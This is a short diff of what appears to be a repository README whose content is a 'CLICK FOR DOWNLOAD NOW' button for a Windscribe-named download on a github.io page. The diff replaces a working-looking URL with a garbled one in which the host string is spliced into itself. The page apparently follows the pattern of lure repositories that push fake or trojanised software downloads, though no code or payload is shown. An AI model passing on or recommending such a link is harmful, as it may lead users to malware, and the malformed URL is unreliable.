@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://Fragmentvonditch.github.io/windscribe-jn38/ ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://Fragmentvonditch.githubhttps://Fragmentvonditch.github.io/windscribe-jn38/.io/windscribe-jn38/ ) |
  |---------------------|----------------------:|
 
 
